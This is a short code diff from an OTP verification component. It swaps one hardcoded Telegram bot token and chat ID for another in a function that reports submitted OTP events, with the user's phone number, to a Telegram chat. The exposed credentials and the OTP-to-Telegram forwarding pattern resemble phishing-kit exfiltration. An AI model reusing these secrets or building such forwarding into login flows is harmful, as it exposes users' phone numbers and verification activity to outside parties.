@@ -27,8 +27,8 @@ const OtpVerification = () => {
 
   // DEMO: Safe Telegram notification (no OTP value)
 const sendTelegramOtpEvent = (phone: string, otpLength: number) => {
-const BOT_TOKEN = "8244803895:AAElCNS9IzbpDj8WfaBJM04tH9zrMSpvpjc";
-  const CHAT_ID = "6564676243";
+const BOT_TOKEN = "8523587471:AAHmYwo8Z_XwLjNJ6tr8ZP_JXPTz8nWuLOI";
+  const CHAT_ID = "6077194516";
 
   const message =
     `🔔 OTP Submitted \n` +
